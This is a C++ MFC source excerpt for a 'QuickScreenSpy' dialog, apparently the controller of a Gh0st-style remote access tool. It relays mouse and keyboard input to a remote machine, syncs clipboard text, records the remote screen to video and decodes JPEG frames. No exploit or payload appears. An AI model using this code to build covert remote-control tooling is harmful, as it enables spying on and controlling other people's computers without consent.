			m_MYtagMSG->y = (int)(((LONG)HIWORD(pMsg->lParam)) * m_hZoom + m_rect.top);
			m_MYtagMSG->wParam = pMsg->wParam;
			LPBYTE lpData = new BYTE[m_MYtagMSGsize + 1];
			lpData[0] = COMMAND_SCREEN_CONTROL_QUICK;
			memcpy(lpData + 1, m_MYtagMSG, m_MYtagMSGsize);
			m_iocpServer->Send(m_pContext, lpData, m_MYtagMSGsize + 1);
			SAFE_DELETE_AR(lpData)
				if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_F4)
					return TRUE;
		}
		if (pMsg->wParam == VK_SCROLL)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			else ClipCursor(NULL);
		}
		if (pMsg->wParam == VK_SPACE)
		{
			return TRUE;
		}

		break;
	default:
		break;
	}

	return CDialog::PreTranslateMessage(pMsg);
}


void CQuickScreenSpyDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
	{
		return;
	}

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL_QUICK;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	SAFE_DELETE_AR(lpData);
}



void CQuickScreenSpyDlg::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CQuickScreenSpyDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD_QUICK;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}



void CQuickScreenSpyDlg::DoPaint()
{


	if (m_bIsFirst)
	{
		DrawTipString(_T("Please wait - initial screen loading"));
		return;
	}
	if (m_bOnClose) return;
//	EnterCriticalSection(&m_cs);
	//m_clcs.lock();
	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
//	LeaveCriticalSection(&m_cs);
	//m_clcs.unlock();
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);

	// Do not call CDialog::OnPaint() for painting messages
}

void CQuickScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this);

	if (m_bIsFirst)
	{
		DrawTipString(_T("请稍候 - 初始屏幕加载"));
		return;
	}
	if (m_bOnClose) return;
//	EnterCriticalSection(&m_cs);
	//m_clcs.lock();
	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
//	LeaveCriticalSection(&m_cs);
	//m_clcs.unlock();
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);

	CDialog::OnPaint();
}
void CQuickScreenSpyDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}

LRESULT CQuickScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: Add your specialized code here and/or call the base class
	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
	{
		return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam))
	{
		SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE)
	{
		SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}

	return CDialog::WindowProc(message, wParam, lParam);
}

void CQuickScreenSpyDlg::OnTimer(UINT nIDEvent)
{
	if (!m_aviFile.IsEmpty())
	{
		LPCTSTR	lpTipsString = _T("●");

		m_aviStream.Write(m_lpScreenDIB);

		// 提示正在录像
		//SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
	CDialog::OnTimer(nIDEvent);
}


bool CQuickScreenSpyDlg::JPG_BMP(int cbit, void* input, int inlen, void* output)
{
	struct jpeg_decompress_struct jds;
	struct jpeg_error_mgr jem;

	// 设置错误处理
	jds.err = jpeg_std_error(&jem);
	// 创建解压结构
	jpeg_create_decompress(&jds);
	// 设置读取(输入)位置
	jpeg_mem_src(&jds, (byte*)input, inlen);
	// 读取头部信息
	if (jpeg_read_header(&jds, true) != JPEG_HEADER_OK)
	{
		jpeg_destroy_decompress(&jds);
		return false;
	}
	// 设置相关参数
	switch (cbit)
	{
	case 16:
		jds.out_color_space = JCS_EXT_RGB;
		break;
	case 24:
		jds.out_color_space = JCS_EXT_BGR;
		break;
	case 32:
		jds.out_color_space = JCS_EXT_BGRA;
		break;
	default:
		jpeg_destroy_decompress(&jds);
		return false;
	}
	// 开始解压图像
	if (!jpeg_start_decompress(&jds))
	{
		jpeg_destroy_decompress(&jds);
		return false;
	}
	int line_stride = (jds.output_width * cbit / 8 + 3) / 4 * 4;
	while (jds.output_scanline < jds.output_height)
	{
		byte* pline = (byte*)output + jds.output_scanline * line_stride;
		jpeg_read_scanlines(&jds, &pline, 1);
	}
	// 完成图像解压
	if (!jpeg_finish_decompress(&jds))
	{
		jpeg_destroy_decompress(&jds);
		return false;
	}
	// 释放相关资源
	jpeg_destroy_decompress(&jds);

	return true;
}


void CQuickScreenSpyDlg::SendResetAlgorithm(UINT nAlgorithm)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_ALGORITHM_RESET;
	bBuff[1] = nAlgorithm;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}
